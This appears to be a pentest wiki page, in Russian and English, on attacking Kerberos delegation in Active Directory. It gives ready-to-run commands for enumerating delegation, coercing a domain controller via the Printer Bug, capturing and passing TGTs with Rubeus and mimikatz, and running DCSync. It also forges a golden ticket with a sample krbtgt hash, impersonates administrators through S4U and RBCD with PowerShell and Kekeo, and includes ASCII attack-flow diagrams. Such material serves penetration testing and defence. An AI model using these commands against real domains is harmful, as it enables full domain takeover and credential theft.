# Kerberos Delegation attacks







Есть два вида делегирования — ограниченное и неограниченное.

## Неограниченное делегирование

При неограниченном делегировании пользователь передает свой TGT тикет сервису.  С точки зрения атакующего: если скомпрометировали сервис с неограниченным делегированием — можем собрать все TGT-тикеты и выполнить Pass-the-Ticket атаку.

### Найти аккаунты

Найти все аккаунты с неограниченным делегированием можно через следующий LDAP-запрос:

```
(UserAccountControl:1.2.840.113556.1.4.803:=524288)
```

Или через следующие инструменты: `Powerview`, `impacket findDelegation.py`, `AD Module` или `ldapsearch`.

### Собираем TGT

Если AP, на котором крутится сервис, будет скомпрометирован, то атакующий сможет получить все TGT-токены (`mimikatz sekurlsa::tickets` или `Rubeus#dump` на Windows машине). Также путем фишинга (например, через создание файлов с ссылками на скомпрометированный сервис), можно заманивать других пользователей на этот сервис и собирать их TGT тикеты.

Важно: если указывать IP-адрес, то никакого Kerberos не будет, будет использоваться NTLM.

Собрав тикеты, атакующий сможет выдавать себя на других сервисах за пользователей (атака Pass-the-Ticket) или попробовать перебрать пароли пользователей к TGTs.

### Мониторинг появления TGT

Для отслеживания появления TGT тикетов можно использовать [`Rubeus#monitor`](https://github.com/GhostPack/Rubeus#monitor).

```
C:\> Rubeus.exe monitor /interval:1
```

### Printer Bug

Более того, вы можете получить TGT учетной записи компьютера, заставив его подключиться к вашему серверу через [Printer bug](https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/41).&#x20;

Чтобы вызвать Printer Bug можем использовать [SpoolSample](https://github.com/leechristensen/SpoolSample) или скрипт [printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). Для поиска машин, для которых включен сервис печати (по умолчанию, это так), можно использовать скрипт [SpoolerScan.ps1](https://github.com/vletoux/SpoolerScanner).

Очень интересный случай, который позволяет скомпрометировать домен, — выполнить ошибку принтера на контроллере домена, чтобы заставить его подключиться к нашему скомпрометированному серверу. Таким образом вы можете получить TGT для учетной записи DC и использовать его для запуска атаки DCSync.

#### Пример

{% tabs %}
{% tab title="PowerView" %}
```
Ищим машины в домене с неограниченным делегированием:
Get-NetComputer -UnConstrained

```
{% endtab %}

{% tab title="AD Module" %}
```
Ищем машины в доомене с неограниченным делегированием:
Get-ADComputer -Filter {TrustedForDelegation -eq $True} 
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
{% endtab %}
{% endtabs %}

Мы должны скомпрометировать сервер, который имеет неограниченное делегирование,  и дождаться коннекта к машине от пользователя, имеющего высокие привилегии.&#x20;

```
Пример со службой печати (Spooler)
Теперь нужно отослать запрос MS-RPRN RpcRemoteFindFirstPrinterChangeNotification 
(аутентификация Kerberos) на сервер печати DC (служба Spooler). 
DC немедленно отправит ответ, который включает TGS (полную копию TGT) учетной записи 
компьютера контроллера домена, так как на нашем хосте используется 
неограниченное делегирование.

Чтобы это сделать, сначала поставим прослушивание входящих соединений с помощью Rubeus:

C:\> Rubeus.exe monitor /interval:1

Теперь инициируем запрос с помощью SpoolSample:

C:\>. \SpoolSample.exe DC.domain.dom yourhost.domain.dom

В Rubeus мы увидим подключение.

Теперь получим TGT:

C:\> Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIBBaE ...
C:\> Rubeus.exe klist

Имея TGT, мы можем выполнить DCSync-атаку с помощью mimikatz:

## lsadump::dcsync /user:HACKER\krbtgt

Мы добыли NTLM-хеш учетной записи krbtgt и теперь можем сделать golden ticket, с которым получим полный доступ ко всей инфраструктуре домена:

## kerberos::golden /user:Administrator /domain:domain.dom /sid:S-1-5-21-1559558046-1467622633-168486225 /krbtgt:9974f218204d6b8109ea99ae9c209f23 /ptt

Теперь можно удаленно подключиться к контроллеру домена с учетной записью администратора:

PS C:\> Enter-PSSession -ComputerName dc
```

Когда пользователь подсоединиться, мы экспортируем все тикеты, включая TGT пользователя:

```
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
```

Далее, тикет может быть переиспользован:

```
Invoke-Mimikatz –Command '"kerberos::ptt D:\tickets\admin.kirbi"'
```

### Собираем TGT без подключения к скомпрометированным сервисам

Для этого нам надо изменить SPN аккаунта с неограниченным делегированием, который мы скомпрометировали. Но для этого нам нужно разрешение Validated-SPN, которое по умолчанию не предоставляется аккаунту-владельцу сервиса. Однако, если это аккаунт компьютера, то они могут добавлять SPN по умолчанию, что совпадают с их именами хостов, которые включены в `msDS-AdditionalDnsHostName` и могут быть изменены этим аккаунтом.

Затем мы можем добавить в качестве нового имени хоста имя хоста нашей машины и создать таким образом SPN, указывающие на нашу машину. Мы можем сделать это с помощью [addspn.py](https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py). Также мы можем добавить SPN с помощью утилиты [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)).

Для того, чтобы hostname указывал на нашу машину, мы должны добавить соответствующую запись в ADIDNS, используя [Powermad](https://github.com/Kevin-Robertson/Powermad) или [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py).

## Ограниченное делегирование (S4U атаки)

### Найти аккаунты

In order to find accounts that use Constrained Delegation, you must search for account with the UserAccountControl TRUSTED\_TO\_AUTH\_FOR\_DELEGATION enabled (S4U2self/Protocol Transition) or with values in the attributes msDS-AllowedToDelegateTo (Classic Constrained Delegation) or msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD).&#x20;

LDAP filter to retrieve accounts related to Constrained Delegation:

```
(|
  (UserAccountControl:1.2.840.113556.1.4.803:=16777216)
  (msDS-AllowedToDelegateTo=*)
  (msDS-AllowedToActOnBehalfOfOtherIdentity=*)
)
```

Или через следующие инструменты: `Powerview`, `impacket findDelegation.py`, `AD Module` или `ldapsearch`.

LDAP filter to retrieve accounts protected against delegation:

```
(|
  (memberof:1.2.840.113556.1.4.1941:=CN=Protected Users,CN=Users,DC=<domain>,DC=<dom>)
  (userAccountControl:1.2.840.113556.1.4.803:=1048576)
)
```

### Запрашиваем ST

Когда определили аккаунты, мы хотим выполнить какие-то операции над Kerberos и S4U расширением, чтобы получить ST выбранных пользователей и выполнить действия от их лица. В качестве инструментов можем использовать:&#x20;

* [MIT kerberos utils](https://labs.f-secure.com/archive/trust-years-to-earn-seconds-to-break/#:\~:text=Practical%20Exploitation) ([ktutitl](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin\_commands/ktutil.html), [kinit](https://web.mit.edu/kerberos/krb5-devel/doc/user/user\_commands/kinit.html), [kvno](https://web.mit.edu/kerberos/krb5-devel/doc/user/user\_commands/kvno.html))
* [Rubeus](https://github.com/GhostPack/Rubeus#s4u)
* [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) impacket script
* [cerbero](https://gitlab.com/Zer1t0/cerbero/)

Additionally, in case of being execute commands as SYSTEM account in a computer with Constrained Delegation (therefore in the context of the computer account in Active Directory), it is possible to use S4U2self and S4U2proxy with a [little of Powershell code](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/#:\~:text=Scenario%202):&#x20;

```powershell
# Code made by Lee Christensen (@tifkin_) and Will Schroeder (@harmj0y)
# Source: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/

# translated from the C# example at https://msdn.microsoft.com/en-us/library/ff649317.aspx

# load the necessary assembly
$Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

# execute S4U2Self w/ WindowsIdentity to request a forwardable TGS for the specified user
$Ident = New-Object System.Security.Principal.WindowsIdentity @('Administrator@FOO.LOCAL')

# actually impersonate the next context
$Context = $Ident.Impersonate()

# implicitly invoke S4U2Proxy with the specified action
ls \\DC01.FOO.LOCAL\C$

# undo the impersonation context
$Context.Undo()
```

Хорошая сторона: во многих случаях (RBCD или `TrustedToAuthForDelegation` включено) мы можем выполнять действия от лица пользователей без какого-либо взаимодействия.

Однако, поскольку количество сервисов, к которым вы можете получить доступ, ограничено, вы должны знать о тех сервисах, которые могут быть полезны при делегировании:

* **LDAP** на DC: The [LDAP](https://zer1t0.gitlab.io/posts/attacking\_ad/#ldap) service of Active Directory is used to manage the accounts, including its permissions, so if you can impersonate an Administrator against the LDAP service, you can give any privileges to any user account that you control. An example is to give rights to an arbitrary to perform a [DCSync attack](https://adsecurity.org/?p=1729) and compromise the domain.
* **SMB** на любом компьютере: In case of being allowed to impersonate any user against the SMB (cifs in the SPN — `CIFS/someuser`) service of a computer, you can access to all the files in the computer, execute commands by using tools like [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) and perform other actions over RPC calls.
* **MSSQL** сервисы: Apart from contain sensitive data that can be an important flag to obtain in a pentest, [MSSQL](https://zer1t0.gitlab.io/posts/attacking\_ad/#sql-server) servers can also allow to users to execute commands via [xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) command, abuse NTLM relay by performing HTTP requests [via xp\_dirtree to a WebDAV server](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-1-mssql-rcelpe), and [many other options](https://github.com/NetSPI/PowerUpSQL).
* **krbtgt** сервисы: If a account is allowed to delegate to the krbtgt service, it can ask [TGTs for any account](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence) that it is allowed to impersonate.

И даже, если вы не можете запросить тикет через классическое ограниченное делегирование (`ms-AllowedToDelegateTo` attribute), но вы можете выполнить ограниченное делегирование на один из сервисов этих же пользователей, то вы можете [сменить SPN в тикете](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/) и получить доступ к сервисам, перечисленным выше.

In order to impersonate a user to a service, you need Resource Based Constrained Delegation (RBCD) or Classic Constrained Delegation with Protocol Transition (S4U2self).

You can enable RBCD to an account by being allowed to write in its ms-AllowedToActOnBehalfOfOtherIdentity attribute and point to an account that has at least one service (in order to use S4U2self).

Если у вас нет учетной записи, в которой есть хотя бы одна служба, вы можете создать одну учетную запись компьютера, [злоупотребив квотой компьютера](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#generic-dacl-abuse), которая позволяет пользователям по умолчанию создавать до 10 учетных записей компьютеров в домене. Это можно сделать с помощью [Powermad](https://github.com/Kevin-Robertson/Powermad#machineaccountquota-functions) или [impacket addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py). После создания учетной записи компьютера (пользователь может выбрать пароль учетной записи компьютера) пользователь, создавший ее, может назначать ей службы. Таким образом, вы можете получить аккаунт с услугами.

Moreover, the accounts by default has permissions to edit its own ms-AllowedToActOnBehalfOfOtherIdentity attribute. So if you are able to get credentials (like NT hash, Kerberos keys, or [TGTs](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce)) of a computer account, you can enable RBCD to an arbitrary user to that computer. This way, you can use RBCD to impersonate an administrator against the computer CIFS (SMB) service and compromise the computer.

Actually, since you have computer account credentials, you can enable RBCD to itself (reflective RBCD). This way you just need to use [S4U2self to ask for a ticket for the computer CIFS service](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#empowering-active-directory-objects-and-reflective-resource-based-constrained-delegation) in order to get a ST to compromise the host. This even works to impersonate protected user accounts. In case you are wondering, this method is required since domain computer accounts doesn't have permissions by default to access remotely to the computer itself as administrator.

Reflective RBCD attack:

```
.----------------------1) LDAP (modify websrv$) --------------------.                                                   
   |      + msds-AllowedToActOnBehalfOfOtherIdentity = ["websrv$"]     |
   |                                                                   v
   |     .----------------2) TGS-REQ---------------------------.      .---.
   ^     |              + SPN: CIFS/websrv                     |     /   /|
   o  >--'              + For user: admin                      '--> .---. |
  /|\                   + TGT websrv$                               |   | '
  / \                                                               |   |/ 
websrv$ <-----------------3) TGS-REP------------------------------< '---'  
   v                  + ST admin > CIFS/websrv                       DC (KDC)
   |
   |                                        .---.
   |                                       /   /|
   '---------4) AP-REQ------------------> .---. |
         + ST admin > CIFS/websrv         |   | '
                                          |   |/ 
                                          '---'  
                                          websrv
```

Notwithstanding, to acquire computer credentials before compromising the machine can be tricky (maybe with [Unconstrained Delegation](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce)?), but in case you can coerce to the computer to make an NTLM-authenticated HTTP request against a host you control, you can use a cross [NTLM relay](https://zer1t0.gitlab.io/posts/attacking\_ad/#ntlm-relay) attack from HTTP to LDAP in order to enable RBCD for the computer account to an account that you control.

To use this primitive you can [take advantage of the WebDAV](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#viable-ntlm-relay-primitives-for-rcelpe) client installed by default in Windows desktops. For instance, you can trigger an authenticated HTTP request by using the [xp\_dirtree procedure of a MSSQL database](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-1-mssql-rcelpe) (you can use [bad\_sequel.py](https://gist.github.com/3xocyte/0dc0bd4cb48cc7b4075bdc90a1ccc7d3) for this).

However, it is possible that you compromise accounts with Classic Constrained Delegation that hasn't Protocol Transition (S4U2self) enabled, so you are unable to ask a ticket for any user. In this case, you could [use RBCD to mimic Protocol Transition](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-accounts-collude---trustedtoauthfordelegation-who). This means you can enable RBCD from the compromised account (the one with Classic Constrained Delegation) to another account, so that other account can ask a ticket for any user to the compromised account, that should be [forwardable since it is produced by S4U2proxy](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#a-forwardable-result) (the [specification has been updated](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-sfu/ce6bbf34-0f11-40d6-93d1-165a3afa0223?redirectedfrom=MSDN) but this fact seems to stay right), this way imitating Protocol Transition.

This could be a little tricky, so lets view an example were the dbsrv is compromised and has Classic Constrained Delegation enabled but without Protocol Transition. However, websrv is also compromised and can be used for RBCD Protocol Transition. Then RBCD is enabled from websrv to dbsrv and websrv is used to mimic protocol transition and finally get an admin ST to compromise filesrv in the following way.

Using RBCD as Protocol Transition:

```
                                      KDC
   .-------1) TGS-REQ-->>------------> .---. <----6) TGS-REQ----<<------------.  
   |    + SPN: HTTP/websrv            /   /| + SPN: CIFS/filesrv              |
   |    + For user: admin            .---. | + TGT dbsrv$                     |
   |    + TGT websrv$                |   | ' + ST(F) admin > MSSQLSvc/dbsrv   |
   |                                 |   |/                                   |
   |  .----2) TGS-REP--<<----------< '---' >------7) TGS-REP---->>--------.   |             
   |  | + ST admin > HTTP/websrv     ^   v   + ST admin > CIFS/filesrv    |   |
   |  |                              |   |                                |   |
   |  |                              |   |                                |   |
   |  |                              |   |                                |   |
   ^  v                              |   |                                |   |
   .---. >--------3) TGS-REQ---->>---'   |                                |   |
  /   /|  + SPN: MSSQLSvc/dbsrv          |                                |   |
 .---. |  + TGT websrv$                  |                                |   |
 |   | '  + ST admin > HTTP/websrv       |                                |   |
 |   |/                                  |                                |   |
 '---' <----------4) TGS-REP----<<-------'                                v   ^
 websrv  + ST(F) admin > MSSQLSvc/dbsrv                                   .---. 
   v                                                                     /   /|  
   |                                                                    .---. | 
   '------------------5) Send the ticket----->>>>---------------------> |   | '                      
                    + ST(F) admin > MSSQLSvc/dbsrv                      |   |/  
                                                                        '---'   
                                                                        dbsrv   
                                  .---.                                  v
                                 /   /|                                  |
                                .---. | <--8) AP-REQ---<<----------------'
                                |   | '  + ST admin > CIFS/filesrv
                                |   |/ 
                                '---'  
                                filesrv
```

In the first four steps, websrv uses S4U2self and S4U2proxy for acquire a forwardable MSSQLSvc/dbsrv ST for admin, thus mimicking Protocol Transition. Then websrv sends this admin ST to dbsrv, that uses it for S4U2proxy and request a CIFS/filesrv ST for admin, that allows to compromise filesrv.

### Пример атаки / типовой последовательности действий

Ограниченное делегирование дает доступ только к конкретным сервисам на конкретных машинах.

Обычный сценарий эксплуатации: пользователь аутентифицируется через не-Kerberos аутентификацию и Protocol Transition используется Kerberos'ом для SSO (в Kerberos есть несколько расширений для Protocol Transition).

Service account должен иметь `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` - `T2A4D` `UserAccountControl` атрибут. Service account т.о. может получить доступ ко всем сервисам, определенным в `msDS-AllowedToDelegateTo` атрибуте.

Другая проблема, что делегирование работает не только для одного конкретного сервиса, но и на все сервисы, запущенные из-под того же аккаунта. Нет проверки для определенного SPN (Service Principle Name).

Пример перечисления пользователей и компьютеров с ограниченным делегированием

{% tabs %}
{% tab title="PowerView (dev)" %}
```
Get-DomainUser –TrustedToAuth 
Get-DomainComputer –TrustedToAuth
```
{% endtab %}

{% tab title="AD Module" %}
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
{% endtab %}
{% endtabs %}

Для получения пароля или NTLM-хеша для service account, можно использовать Kekeo: [https://github.com/gentilkiwi/kekeo/](https://github.com/gentilkiwi/kekeo/)

```
.\asktgt.exe /user:someadmin /domain:my.domain.local /key:098f6bcd4621d373cade4e832627b4f6 /ticket:someadmin.kirbi
```

Теперь, используя s4u из Kekeo, запрашиваем TGS:

```
\s4u.exe /tgt:someadmin.kirbi /user:Administrator@my.domain.local /service:cifs/my-sqlsrv.my.domain.local
```

Используем TGS

```
Invoke-Mimikatz -Command '"kerberos::ptt cifs.my-sqlsrv.my.domain.local.kirbi"'
ls \\my-sqlsrv.my.domain.local\c$
```

Делегирование не ограничивается по SPN => можно создавать тикеты для других сервисов. **Изучить это**.

## Tools

### krbrelayx

krbrelayx — Unconstrained delegation abuse toolkit. Link: https://github.com/dirkjanm/krbrelayx/ Require: Impacket, ldap3
